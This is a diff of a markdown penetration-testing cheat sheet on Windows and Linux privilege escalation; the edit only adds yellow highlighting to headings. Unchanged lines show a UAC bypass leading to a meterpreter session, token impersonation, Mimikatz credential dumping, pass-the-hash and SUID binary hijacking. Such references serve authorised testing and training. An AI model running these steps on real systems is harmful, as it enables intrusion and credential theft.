@@ -1,17 +1,17 @@
 # Privilege Escalation
 
-## Windows
+## <mark style="color:yellow;">Windows</mark>
 
 Note: if you have a valid user credential you can authenticate in windows target from SMB, RDP, WinRM
 
-### Automation script
+### <mark style="color:yellow;">Automation script</mark>
 
 ```batch
 :: https://github.com/itm4n/PrivescCheck
 powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 ```
 
-### UAC Bypass
+### <mark style="color:yellow;">UAC Bypass</mark>
 
 User Account Control (UAC) is a feature that enables a consent prompt for elevated activities.
 
@@ -46,7 +46,7 @@ Akagi64.exe 23 <payload_full_path> # NOTE FULL PATH
 # Once run, we will get meterpreter session - getprivs/getsystem to get elevated privs
 ```
 
-### Impersonate Tokens
+### <mark style="color:yellow;">Impersonate Tokens</mark>
 
 **Metasploit - incognito**
 
@@ -82,7 +82,7 @@ ps
 migrate 2948
 ```
 
-### Password in configuration file (Unattend.xml)
+### <mark style="color:yellow;">Password in configuration file (Unattend.xml)</mark>
 
 An answer file is an XML-based file that contains setting definitions and values to use during Windows Setup. Answer files (or Unattend files) are used by Administrators when they are setting up fresh images as it allows for an automated setup for Windows systems.
 
@@ -96,7 +96,7 @@ C:\Windows\system32\sysprep\sysprep.xml
 
 Extract password and decode it (from base64)
 
-### Credential Dumping (Mimikatz - Kiwi - Hashdump)
+### <mark style="color:yellow;">Credential Dumping (Mimikatz - Kiwi - Hashdump)</mark>
 
 Prerequisites: User must be a member a local Administrators.
 
@@ -143,7 +143,7 @@ lsadump::sam
 sekurlsa::logonpasswords  
 ```
 
-### Pass the Hash
+### <mark style="color:yellow;">Pass the Hash</mark>
 
 ```sh
 # 1. Method
@@ -159,7 +159,7 @@ Notes:
   * `AAD3B435B51404EEAAD3B435B51404EE:<NTLM>`
 * With `hashdump` you have the right format
 
-### Other
+### <mark style="color:yellow;">Other</mark>
 
 * Powershell History
 * Saved Windows Credentials
@@ -172,9 +172,9 @@ Notes:
 * Windows Privileges
 * Unpatched Software
 
-## Linux
+## <mark style="color:yellow;">Linux</mark>
 
-### Vulnerable program
+### <mark style="color:yellow;">Vulnerable program</mark>
 
 Search scripts that execute programs or programs. Search for any vulnerable version. One example: chkrootkit v0.49 (running as root)
 
@@ -182,19 +182,19 @@ Search scripts that execute programs or programs. Search for any vulnerable vers
 ps aux
 ```
 
-### Weak Permissions
+### <mark style="color:yellow;">Weak Permissions</mark>
 
 <pre class="language-sh"><code class="lang-sh"><strong># World-writable files - Ex: maybe you can edit shadow file
 </strong><strong>find / -not -type l -perm -o+w
 </strong></code></pre>
 
-### Sudo
+### <mark style="color:yellow;">Sudo</mark>
 
 <pre class="language-sh"><code class="lang-sh">sudo -l
 <strong># Search on https://gtfobins.github.io/ how to exploit
 </strong></code></pre>
 
-### SUID - custom binary
+### <mark style="color:yellow;">SUID - custom binary</mark>
 
 Premise: you have `binary_name` (with suid) that use/load/execute `loaded_binary`
 
@@ -231,7 +231,7 @@ gcc binary.c -o <loaded_binary>
 ./binary_name
 ```
 
-### Other
+### <mark style="color:yellow;">Other</mark>
 
 * `sudo -l`
   * setenv?
@@ -270,7 +270,7 @@ gcc binary.c -o <loaded_binary>
 * Linpeas.sh
 * [GTFObins](https://gtfobins.github.io)
 
-## Resource
+## <mark style="color:yellow;">Resource</mark>
 
 * **gtfobins.github.io** _GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems_
 * **github.com/carlospolop/PEASS-ng/tree/master/linPEAS** _Linux Privilege Escalation Awesome Script_
